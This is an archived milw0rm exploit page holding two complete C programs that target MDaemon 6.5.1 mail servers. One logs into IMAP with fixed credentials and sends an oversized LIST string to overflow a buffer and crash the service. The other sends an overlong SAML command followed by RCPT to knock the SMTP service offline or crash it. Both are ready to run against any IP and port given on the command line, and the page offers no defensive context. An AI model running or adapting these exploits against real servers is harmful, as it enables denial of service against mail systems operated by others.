<html>
<head>
<title>milw0rm productions</title>
<pre>
/////////////////////////////////////////////////////////////
// Remote proof-of-concept exploit //
// for //
// Mdaemon IMAP server v6.5.1 //
// and //
// possible other version. //
// Find bug: D_BuG. //
// Author: D_BuG. //
// D_BuG@bk.ru // 
// Data: 16/09/2004 //
// NOT PUBLIC! //
// // 
/////////////////////////////////////////////////////////////

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;

int sock,err;
struct sockaddr_in sa;


int main (int argc, char *argv[])

{

printf(&quot;Remote proof-of-concept(buffer overflow) exploit\n&quot;);
printf(&quot; for \n&quot;);
printf(&quot;Mdaemon IMAP server v6.5.1 and possible other version.\n&quot;); 
if(argc!=3)
{
printf(&quot;Usage: %s &lt;IPADDRESS&gt; &lt;PORT&gt;\n&quot;,argv[0]);
printf(&quot;e.g.:%s 192.168.1.1 143\n&quot;,argv[0]);
exit(-1);
}


sa.sin_family=AF_INET;
sa.sin_port=htons(atoi(argv[2]));
if(inet_pton(AF_INET, argv[1], &amp;sa.sin_addr) &lt;= 0)
printf(&quot;Error inet_pton\n&quot;);

sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);

printf(&quot;[~]Connecting...\n&quot;);

if(connect(sock,(struct sockaddr *)&amp;sa,sizeof(sa)) &lt;0)
{
printf(&quot;[-]Connect filed....\nExit...\n&quot;);
exit(-1);
}


char send[]=&quot;0001 LOGIN &quot;&quot;test&quot;&quot; &quot;&quot;console&quot;&quot;\r\n&quot;;
char send3[]=
&quot;007x LIST &quot;
&quot;&quot;&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaAAAA&quot;&quot;&quot;
&quot;&quot;&quot; *BBBBBBBBBBaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaAaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaaaAAAAAAAAAAAAAAAAAAAAAAAAAAAAc&quot;&quot;&quot;
&quot;\r\n\r\n&quot;;
char rcv[1024];


printf(&quot;[+]Ok!\n&quot;);
sleep(2);
printf(&quot;[~]Get banner...\n&quot;);
if(read(sock,&amp;rcv,sizeof(rcv)) !=-1){}

if(strstr(rcv,&quot;IMAP&quot;)==NULL)
{
printf(&quot;[-]Failed!\n&quot;);
}
else
{ 
printf(&quot;[+]Ok!\n&quot;);
}

printf(&quot;[~]Send LOGIN and PASSWORD...\n&quot;);
write(sock,send,sizeof(send)-1);
sleep(2);
memset(rcv,0,1024);
if(read(sock,&amp;rcv,sizeof(rcv)) !=-1){}

if(strstr(rcv,&quot;OK&quot;)==NULL)
{
printf(&quot;[-]Failed login or password...\nExit...&quot;);
exit(-1);
}

printf(&quot;[+]Ok!\n&quot;);

printf(&quot;[~]Send LIST...\n&quot;);
write(sock,send3,sizeof(send3)-1);
sleep(2);
memset(rcv,0,1024);
if(read(sock,&amp;rcv,sizeof(rcv)) !=-1){}

if(strstr(rcv,&quot;BAD&quot;)!=NULL)
{
printf(&quot;[-]Exploit filed...please check your version Mdaemon!\n&quot;);
printf(&quot;[-]Exit...\n&quot;);
exit(-1);
}
printf(&quot;[+]Ok!\n&quot;);
printf(&quot;[+]Crash service.....\n&quot;);
printf(&quot;[~]Done.\n&quot;);

close(sock);

return 0;

}








mdaemon_rcpt.c

/////////////////////////////////////////////////////////////
// Remote DoS and proof-of-concept exploit //
// for //
// Mdaemon smtp server v6.5.1 //
// and //
// possible other version. //
// Find bug: D_BuG. //
// Author: D_BuG. //
// D_BuG@bk.ru // 
// Data: 16/09/2004 //
// NOT PUBLIC! //
// Greets:Rasco. // 
/////////////////////////////////////////////////////////////

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;

int sock,err;
struct sockaddr_in sa;


int main (int argc, char *argv[])

{

printf(&quot;Remote DoS and proof-of-concept(buffer overflow) exploit\n&quot;);
printf(&quot; for \n&quot;);
printf(&quot;Mdaemon smtp server v6.5.1 and possible other version.\n&quot;); 
if(argc!=4)
{
printf(&quot;Usage: %s &lt;IPADDRESS&gt; &lt;PORT&gt; &lt;TARGET&gt;\n&quot;,argv[0]);
printf(&quot;Target:\n1.DoS.\n2.Proof-of-concept(buffer overflow).\n&quot;);
printf(&quot;e.g.:%s 192.168.1.1 25 1\n&quot;,argv[0]);
exit(-1);
}


sa.sin_family=AF_INET;
sa.sin_port=htons(atoi(argv[2]));
if(inet_pton(AF_INET, argv[1], &amp;sa.sin_addr) &lt;= 0)
printf(&quot;Error inet_pton\n&quot;);

sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);

printf(&quot;[~]Connecting...\n&quot;);

if(connect(sock,(struct sockaddr *)&amp;sa,sizeof(sa)) &lt;0)
{
printf(&quot;[-]Connect filed....\nExit...\n&quot;);
exit(-1);
}

int len=247;

if(atoi(argv[3])==2)
{
len++;
}

char szBuffer[len+7];
char buff[len];
char send[]=&quot;EHLO tester\n&quot;;
char send3[]=&quot;RCPT TO postmaster\n&quot;;
char rcv[1024];
int i;
for(i=0;i&lt;len;i++)
{
buff[i]=0x41;
}

sprintf(szBuffer,&quot;SAML %s\n&quot;,buff);

printf(&quot;[+]Ok!\n&quot;);
sleep(2);
printf(&quot;[~]Get banner...\n&quot;);
if(read(sock,&amp;rcv,sizeof(rcv)) !=-1){}

if(strstr(rcv,&quot;220&quot;)==NULL)
{
printf(&quot;[-]Failed!\n&quot;);
}
else
{ 
printf(&quot;[+]Ok!\n&quot;);
}

printf(&quot;[~]Send EHLO...\n&quot;);
write(sock,send,sizeof(send)-1);
sleep(2);
memset(rcv,0,1024);
if(read(sock,&amp;rcv,sizeof(rcv)) !=-1){}

if(strstr(rcv,&quot;250&quot;)==NULL)
{
printf(&quot;[-]Failed...\n&quot;);
}
else
{
printf(&quot;[+]Ok!\n&quot;);
}
printf(&quot;[~]Send SAML...\n&quot;);
write(sock,szBuffer,strlen(szBuffer));//Send SAML
sleep(2);
memset(rcv,0,1024);
if(read(sock,&amp;rcv,sizeof(rcv)) !=-1){}

if(strstr(rcv,&quot;250&quot;)==NULL)
{
printf(&quot;[-]Exploit failed...please check your version Mdaemon!\n&quot;);
printf(&quot;[-]Exit...\n&quot;);
exit(-1);
}
printf(&quot;[+]Ok!\n&quot;);

printf(&quot;[~]Send RCPT...\n\n&quot;);
write(sock,send3,sizeof(send3)-1);//Send RCPT
sleep(2);
if(atoi(argv[3])==2)
{
printf(&quot;[+]Crash service.....\n&quot;);
}
else
{
printf(&quot;[+]DoS service.....\n&quot;);
}
printf(&quot;[~]Done.\n&quot;);

close(sock);

return 0;

}</pre>
//downloaded from milw0rm.com
</html>


<!-- BBClone v 0.4.2 OK: counter files updated -->

<!-- BBClone 0.4.2 OK: access files updated -->
